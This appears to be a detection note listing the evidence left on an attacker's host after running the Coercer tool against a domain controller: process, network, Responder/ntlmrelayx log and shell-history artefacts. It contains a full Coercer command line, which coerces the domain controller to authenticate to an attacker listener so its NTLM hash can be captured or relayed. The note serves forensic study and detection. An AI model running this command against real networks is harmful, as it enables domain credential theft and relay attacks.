# Coercer — Source Evidence

Evidence on attacker's host after running Coercer.

---

## Process and Network

**Coercer process:**
- Python process with command: `python3 -m coercer -u CORP\attacker -p password -d corp.local -t 192.168.1.10 ...`
- Parent: shell or systemd.
- Child processes: none (single-threaded).

**Listening ports:** Typically none (Coercer connects out, doesn't listen). Responder/ntlmrelayx listening ports remain (53, 80, 445, etc.).

**Network connections:**
```bash
ss -tnp | grep python
# ESTAB  192.168.1.99:40000  192.168.1.10:445  (connection to target RPC)
# ESTAB  192.168.1.99:40001  192.168.1.99:6666 (if relaying to ntlmrelayx)
```

---

## Log Files

**Coercer output (console):**
```
[*] Authenticating to 192.168.1.10...
[+] Successfully authenticated as CORP\attacker
[*] Attempting efsrpc coercion...
[+] EFS coercion call made
[+] Callback received from 192.168.1.10 (CORP\DC01$)
```

**Responder logs** (if running in parallel):
- `logs/SMB-NTLMv2-Client-<victim-ip>.txt`: Captured NTLM hash
- Exact format: `CORP\DC01$::CORP:1122334455667788:8899aabbccddeeff...`

**ntlmrelayx logs** (if relay active):
- Relay success messages
- Target authentication logs (LDAP, SMB, etc.)

---

## Shell History

```bash
# In ~/.bash_history:
python3 -m coercer -u 'CORP\attacker' -p 'password' -d corp.local -t 192.168.1.10 --listener 192.168.1.99 -co efsrpc -vv
```

---

## Strongest Signals

1. **Coercer process + command-line** — Python with `coercer` binary name + domain credentials is distinctive.
2. **Responder/ntlmrelayx logs** — Captured NTLM hashes from unexpected sources (DC, service accounts).
3. **Shell history** — `coercer` + domain credentials + target DC IP.

---

**Next:** See `04 - Target Evidence.md`.
